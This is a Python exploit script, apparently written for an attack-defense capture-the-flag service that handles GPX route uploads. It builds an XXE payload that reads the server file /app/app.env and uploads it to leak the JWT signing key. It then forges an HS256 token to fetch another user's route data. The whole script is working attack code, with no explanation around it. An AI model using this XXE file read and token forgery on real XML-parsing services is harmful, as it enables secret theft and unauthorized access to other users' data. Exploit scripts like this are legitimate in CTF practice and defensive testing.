import re
import jwt
import checklib
import sys

import requests

pld = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE sym [<!ENTITY test SYSTEM 'file:////app/app.env'>]>
<gpx xmlns="http://www.topografix.com/GPX/1/1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd" version="1.1" creator="test">
<wpt lat="65.938" lon="84.09729999999999">
<ele>650.4</ele>
<time>2024-04-03T00:12:51.294446</time>
<name>a</name>
<desc>b</desc>
<sym>&test;</sym>
</wpt>
<trk>
<trkseg>
<trkpt lat="65.937" lon="84.0983">
<ele>650</ele>
<time>2024-04-03T00:12:23.294446</time>
</trkpt>
<trkpt lat="65.938" lon="84.09729999999999">
<ele>650.4</ele>
<time>2024-04-03T00:12:51.294446</time>
</trkpt>
</trkseg>
</trk>
</gpx>'''


def leak_key(sess: requests.Session, host: str):
    resp = sess.post(f'{host}/api/route/create', json={
        'title': 'a',
        'description': 'b'
    })
    assert resp.status_code == 200
    route_id = resp.json().get('id')
    resp = sess.post(f'{host}/api/route/{route_id}/upload', files={
        'file': pld
    })
    key = re.findall(r"JWT_KEY=([A-Z\d]+)", resp.text)
    assert len(key) == 1
    return key[0]


def pwn(ip: str, hint: str):
    host = 'http://' + ip + ':8000'

    s = checklib.get_initialized_session()
    u, p = checklib.rnd_username(), checklib.rnd_password()
    s.post(host + '/api/signup', json={'username': u, 'password': p})

    jwt_key = leak_key(s, host)

    token = jwt.encode({'route_id': hint}, jwt_key, algorithm='HS256')

    resp = s.get(host + '/api/route/' + hint, params={'token': token})
    print(resp.text, flush=True)


if __name__ == '__main__':
    pwn(sys.argv[1], sys.argv[2])
